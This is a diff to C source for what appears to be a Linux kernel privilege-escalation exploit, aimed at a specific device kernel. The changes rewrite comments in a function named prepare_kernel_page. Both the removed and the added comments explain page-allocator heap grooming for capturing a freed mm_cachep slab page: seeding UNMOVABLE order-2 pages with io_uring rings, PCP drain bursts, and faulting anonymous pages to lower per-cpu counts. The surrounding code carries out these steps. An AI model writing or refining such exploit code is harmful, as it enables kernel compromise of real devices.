@@ -1145,26 +1145,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           ks->thread_cnt, ks->collisions, ks->total_futexes,
           ks->identity_diff);
 
-  /* UNMOVABLE ORDER-2 SEED (migratetype control for the target slab).
-   * A slab page's migratetype is fixed at ALLOCATION time: if the
-   * buddy's UNMOVABLE freelist happens to be empty when mm_cachep
-   * allocates a new slab, the page allocator falls back to a MOVABLE
-   * block and the page is typed MIGRATE_MOVABLE forever. On discard
-   * it then lands on the per-cpu PCP MOVABLE order-2 list - and the
-   * PCP serves ONLY the requested migratetype (no fallback), so no
-   * GFP_KERNEL allocation - including every io_uring reclaim ring -
-   * can ever take it: the capture misses 100% (the on-device collapse
-   * of the reclaim rate; the freed page stays untouched, verified by
-   * the stale mm->start_code still being in the panic registers).
-   *
-   * Seed the UNMOVABLE order-2 pool right before the child burst:
-   * allocate a pile of io_uring rings (GFP_KERNEL_ACCOUNT = UNMOVABLE
-   * order-2 pages), then close them all so mm_cachep's slab
-   * allocations for the child burst draw fresh UNMOVABLE-typed pages
-   * (from the PCP order-2 UNMOVABLE head or the buddy UNMOVABLE list).
-   * The target page is then UNMOVABLE-typed and the discard lands on
-   * the PCP UNMOVABLE order-2 head, where the drain-loop io_uring
-   * allocation takes it - the original capture design. */
+  /* REFERENCE/SABRINA ORDER-2 SEED HEURISTIC.
+   * A slab page returns according to its actual pageblock migratetype. An
+   * UNMOVABLE request can fall back to a MOVABLE pageblock, so allocating and
+   * closing io_uring rings does NOT prove that the returned pages are
+   * UNMOVABLE.  The exact V643 route is refused above; this historical seed
+   * remains a heuristic for already-qualified profiles only. */
   if (env_flag("UNMOVABLE_SEED", 1)) {
     int seed_rings = env_int_range("UNMOVABLE_SEED_RINGS", 200, 0, 220);
     int seeded = 0;
@@ -1500,15 +1486,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               FAKE_WAITER_PI_TREE_ENTRY_OFF);
   }
 
-  /* PCP DRAIN BURST: the discarded target page is only reliably
-   * capturable while it sits at the head of the order-2 PCP list. If
-   * pcp->count >= high at its commit, free_unref_page_commit immediately
-   * flushes it to the buddy, where it merges with its (usually free)
-   * buddy and is buried in a higher-order block that our order-2/3
-   * allocations may never split down to. This kernel's __rmqueue_pcplist
-   * does NOT refill the PCP from the buddy (an empty list just fails over
-   * to the buddy), so a burst of order-2 allocations genuinely empties
-   * the list and keeps the count far below the flush threshold. */
+  /* PCP PRECONDITIONING BURST (reference route only).  V643
+   * get_populated_pcp_list() refills an empty exact list from the buddy; with
+   * batch=63 an order-2 refill requests 15 entries.  A burst therefore does
+   * not prove that the list is empty or that the shared PCP count is below
+   * high.  TCL never reaches this block while its route is unproven. */
   int reclaim_probe = env_flag("RECLAIM_PROBE", 0);
   if (env_flag("USE_URING", 1) && !reclaim_probe) {
     int burst = env_int_range("PCP_DRAIN_BURST", 24, 0, 256);
@@ -1517,19 +1499,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     pr_info("PCP drain burst: %d rings total\n", uring_count / 2);
   }
 
-  /* PCP COUNT DRAIN: pcp->count is shared across migratetypes and
-   * orders, and free_unref_page_commit() flushes the ENTIRE pcp list to
-   * the buddy (where the freshly discarded mm page merges with its
-   * usually-free buddy into order-3+ blocks) whenever count >= high at
-   * commit. Background order-0 frees keep the count near high on this
-   * device, so the discard lands in the buddy instead of waiting at the
-   * order-2 PCP head for the drain-loop io_uring allocation. Fault in a
-   * few MB of anonymous pages right before the drain window: order-0
-   * MOVABLE allocations decrement the SAME per-cpu count, dropping it
-   * far below high, so the discard commit cannot flush. The mapping is
-   * kept (munmap would push the count back up). MADV_NOHUGEPAGE keeps
-   * the faults order-0 - a THP fault would allocate order-9 pages,
-   * which bypass the PCP entirely. */
+  /* PCP COUNT HEURISTIC (reference route only).  pcp->count is shared across
+   * migratetypes/orders, but an empty order-0 MOVABLE list is batch-refilled
+   * from the buddy and other lists remain populated.  Faulting anonymous
+   * pages can consume existing PCP pages; it cannot prove a global count
+   * below high on V643.  The mapping is kept to avoid immediately returning
+   * the pages. MADV_NOHUGEPAGE avoids an order-9 THP allocation. */
   if (env_flag("PCP_COUNT_DRAIN", 1) && !reclaim_probe) {
     size_t mb = (size_t)env_int_range("PCP_COUNT_DRAIN_MB", 8, 0, 64);
     if (mb) {
